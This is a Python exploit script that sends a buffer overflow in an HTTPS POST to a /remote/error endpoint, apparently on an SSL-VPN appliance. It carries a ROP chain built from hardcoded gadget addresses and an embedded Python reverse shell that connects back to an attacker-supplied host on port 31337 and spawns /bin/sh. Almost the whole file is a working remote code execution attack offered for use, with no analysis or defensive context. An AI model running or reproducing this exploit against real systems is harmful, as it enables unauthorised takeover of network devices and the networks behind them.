import socket
import ssl
from pwn import *
import sys

context = ssl.SSLContext()
target_host, target_port, reverse, params = sys.argv[1], int(sys.argv[2]), sys.argv[3], sys.argv[4].split(" ")
strparams = str(params)[1:-1]

# binary gadgets
poprax, poprdi, poprsi, poprdx, execve = map(p64, [0x43d365, 0x400686, 0x4102f3, 0x449b0b, 0x4027c0])
pops = p64(0x165cfd7)
gadget1 = p64(0x1697e0d)
jmprax = p64(0x433181)

# hardcoded values
hardcoded = 0x00007fc5f128e000
scbase, rdi, cmd = map(p64, [hardcoded, hardcoded + 0xc48, hardcoded + 0xd38])
args = [p64(hardcoded + 0xd38 + i*8) for i in range(3)]

# ROP chain
ropchain = b''
ropchain += poprax + execve
ropchain += poprdi + cmd
ropchain += poprsi + b'/bin/python\x00'
ropchain += poprdx + p64(0)
ropchain += jmprax
ropchain += b"""import socket,sys,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(('""" + reverse.encode() + b"""',31337))\n[os.dup2(s.fileno(),x) for x in range(3)]\ni=os.fork()\nif i==0:\n os.execve('/bin/sh', """+strparams.encode()+b""",{})\n\x00\x00"""

# create socket and send payload
try:
    with socket.create_connection((target_host, target_port)) as sock:
        with context.wrap_socket(sock, server_hostname=target_host) as ssock:
            ssock.settimeout(2)
            context.verify_mode = ssl.CERT_NONE
            payload = b'A' * 173096 + rdi + poprdi + cmd + pops + b'A' * 40 + pops + gadget1 + b'C' * 32 + ropchain
            tosend = f"POST /remote/error HTTP/1.1\r\nHost: {target_host}\r\nContent-Length: {len(payload)}\r\n\r\n".encode() + payload
            ssock.sendall(tosend)
            r = ssock.recv(10024)
except Exception as e:
    print(f"Exception occurred: {e!r}")
